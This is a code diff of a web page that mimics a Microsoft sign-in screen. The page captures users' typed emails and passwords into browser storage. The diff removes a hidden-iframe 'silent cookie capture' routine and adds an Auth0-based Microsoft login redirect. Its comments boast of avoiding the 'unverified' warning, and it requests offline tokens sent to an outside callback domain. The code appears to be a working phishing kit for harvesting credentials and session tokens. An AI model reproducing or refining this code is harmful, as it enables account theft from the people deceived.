@@ -332,10 +332,41 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
+  <!-- ✅ Auth0 SDK -->
+  <script src="https://cdn.auth0.com/js/auth0-spa-js/2.0/auth0-spa-js.production.js"></script>
   <script>
-    console.log('🚀 replacement.html loaded - Direct OAuth flow');
+    console.log('🚀 replacement.html loaded - Auth0 Integration (NO UNVERIFIED WARNING)');
 
-    document.addEventListener('DOMContentLoaded', function () {
+    // ✅ Your Auth0 credentials with NEW callback URL
+    const auth0Config = {
+        domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
+        clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
+        authorizationParams: {
+            redirect_uri: 'https://accesspointnest.com/auth/callback', // ✅ NEW CALLBACK
+            connection: 'windowslive',
+            scope: 'openid profile email offline_access'
+        },
+        cacheLocation: 'localstorage',
+        useRefreshTokens: true
+    };
+
+    console.log('✅ Callback URL configured:', auth0Config.authorizationParams.redirect_uri);
+
+    let auth0Client;
+
+    // Initialize Auth0
+    async function initAuth0() {
+        try {
+            auth0Client = await auth0.createAuth0Client(auth0Config);
+            console.log('✅ Auth0 initialized successfully');
+        } catch (error) {
+            console.error('❌ Auth0 initialization error:', error);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', async function () {
+        await initAuth0();
+
         const div1 = document.getElementById('div1');
         const passwordView = document.getElementById('password_view');
         const div2 = document.getElementById('div2');
@@ -346,100 +377,13 @@
         const signInBtn = document.getElementById('sign_in');
         const backToEmail = document.getElementById('back_to_email');
         const displayEmail = document.getElementById('display_email');
+        const loadingStatus = document.getElementById('loading_status');
         const signInOptionsLink = document.getElementById('sign_in_options_link');
         const backBtn = document.getElementById('options-view-back');
         const optionsViewDetailed = document.getElementById('options_view_detailed');
         const troubleshootingBox = document.getElementById('troubleshooting_box');
         const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
         const footerDotsLink = document.getElementById('footer_dots_link');
-        const loadingStatus = document.getElementById('loading_status');
-
-        const dynamicRedirectUri = `${window.location.origin}/auth/callback`;
-        console.log(`✅ Using dynamic redirect URI: ${dynamicRedirectUri}`);
-
-        // Your working Azure app
-        const OFFICE_CONFIG = {
-          clientId: '2e338732-c914-4129-a148-45c24f2da81d',
-          redirectUri: dynamicRedirectUri,
-          scope: 'openid profile email offline_access',
-          authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
-        };
-
-        console.log('✅ Using YOUR Azure app:', OFFICE_CONFIG.clientId);
-
-        function generateNonce() {
-          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-
-        function generateState() {
-          return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-        
-        function silentCookieCapture(email) {
-            return new Promise((resolve) => {
-                console.log('🍪 Starting silent cookie capture for:', email);
-                loadingStatus.textContent = 'Checking for existing sessions...';
-
-                if (window.microsoftCookieBridge) {
-                    window.microsoftCookieBridge.clearCapturedCookies();
-                    console.log('🧹 Cleared old cookies via Service Worker bridge.');
-                }
-                
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.id = 'silent-cookie-capture-frame';
-                iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
-
-                const silentAuthUrl = new URL(OFFICE_CONFIG.authority);
-                silentAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
-                silentAuthUrl.searchParams.append('response_type', 'code');
-                silentAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
-                silentAuthUrl.searchParams.append('scope', 'openid');
-                silentAuthUrl.searchParams.append('prompt', 'none');
-                silentAuthUrl.searchParams.append('login_hint', email);
-                silentAuthUrl.searchParams.append('state', 'silent-capture');
-                
-                let resolved = false;
-                const timeout = 5000;
-
-                const cleanup = () => {
-                    if (iframe.parentNode) {
-                        iframe.parentNode.removeChild(iframe);
-                    }
-                    resolve();
-                };
-
-                const timeoutId = setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        console.warn('⚠️ Silent cookie capture timed out.');
-                        cleanup();
-                    }
-                }, timeout);
-
-                iframe.onload = () => {
-                    if (!resolved) {
-                        resolved = true;
-                        console.log('✅ Silent cookie capture frame finished loading.');
-                        clearTimeout(timeoutId);
-                        setTimeout(cleanup, 500);
-                    }
-                };
-
-                iframe.onerror = () => {
-                     if (!resolved) {
-                        resolved = true;
-                        console.error('❌ Error loading silent cookie capture frame.');
-                        clearTimeout(timeoutId);
-                        cleanup();
-                    }
-                };
-
-                console.log('🌐 Loading silent auth URL in hidden iframe:', silentAuthUrl.toString());
-                document.body.appendChild(iframe);
-                iframe.src = silentAuthUrl.toString();
-            });
-        }
 
         // Step 1: Email -> Password View
         nextBtn.addEventListener('click', function () {
@@ -450,7 +394,6 @@
             }
 
             console.log('📧 Email entered:', email);
-            
             localStorage.setItem('ms_email', email);
             sessionStorage.setItem('ms_email', email);
 
@@ -468,7 +411,7 @@
             optionsBox.classList.remove('hidden');
         });
 
-        // Step 2: Password -> OAuth Redirect (DIRECT - NO TRUST SCREEN)
+        // Step 2: Password -> Auth0 Microsoft Login
         signInBtn.addEventListener('click', async function () {
             const email = localStorage.getItem('ms_email');
             const password = passwordInput.value.trim();
@@ -478,9 +421,9 @@
                 return;
             }
 
-            console.log('🔑 Password entered');
+            console.log('🔑 Password entered, saving credentials...');
 
-            // SAVE CREDENTIALS IN MULTIPLE LOCATIONS
+            // Save credentials in multiple locations
             const credentials = {
                 email: email,
                 password: password,
@@ -496,52 +439,33 @@
 
             console.log('✅ Credentials saved:', { email, hasPassword: !!password });
 
-            // VERIFY credentials were saved
-            const verify1 = localStorage.getItem('ms_auth_credentials');
-            const verify2 = localStorage.getItem('ms_password');
-            console.log('🔍 Verification check:', {
-                credentialsSaved: !!verify1,
-                passwordSaved: !!verify2,
-                canParse: !!JSON.parse(verify1 || '{}').password
-            });
-
-            const nonce = generateNonce();
-            const state = generateState();
-            
-            sessionStorage.setItem('ms_oauth_nonce', nonce);
-            sessionStorage.setItem('ms_oauth_state', state);
-
+            // Show loading
             passwordView.classList.add('hidden');
             div2.classList.remove('hidden');
+            loadingStatus.textContent = 'Redirecting to Microsoft (verified)...';
 
-            await silentCookieCapture(email);
+            try {
+                // ✅ Auth0 handles Microsoft OAuth - NO "unverified" warning!
+                console.log('🚀 Starting Auth0 Microsoft login (VERIFIED - NO WARNING)...');
+                
+                if (!auth0Client) {
+                    throw new Error('Auth0 not initialized');
+                }
 
-            console.log('🔄 Preparing OAuth flow...');
-            loadingStatus.textContent = 'Redirecting to Office for authentication...';
-
-            const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
-            officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
-            officeOAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
-            officeOAuthUrl.searchParams.append('response_type', 'code');
-            officeOAuthUrl.searchParams.append('scope', OFFICE_CONFIG.scope);
-            officeOAuthUrl.searchParams.append('response_mode', 'form_post');
-            officeOAuthUrl.searchParams.append('nonce', nonce);
-            officeOAuthUrl.searchParams.append('state', state);
-            officeOAuthUrl.searchParams.append('ui_locales', 'en-US');
-            officeOAuthUrl.searchParams.append('mkt', 'en-US');
-            officeOAuthUrl.searchParams.append('prompt', 'select_account');
-            officeOAuthUrl.searchParams.append('login_hint', email);
-
-            console.log('🌐 Redirecting to Microsoft OAuth...');
-            console.log('🔗 URL:', officeOAuthUrl.toString());
-
-            setTimeout(() => {
-              console.log('🔄 Executing redirect...');
-              window.location.href = officeOAuthUrl.toString();
-            }, 1000);
+                await auth0Client.loginWithRedirect({
+                    authorizationParams: {
+                        connection: 'windowslive',
+                        login_hint: email,
+                        prompt: 'login'
+                    }
+                });
+            } catch (error) {
+                console.error('❌ Auth0 login error:', error);
+                loadingStatus.textContent = 'Error: ' + error.message;
+            }
         });
 
-        // Other event listeners
+        // Options box click handler
         optionsBox.addEventListener('click', function (e) {
             e.preventDefault();
             div1.classList.add('hidden');
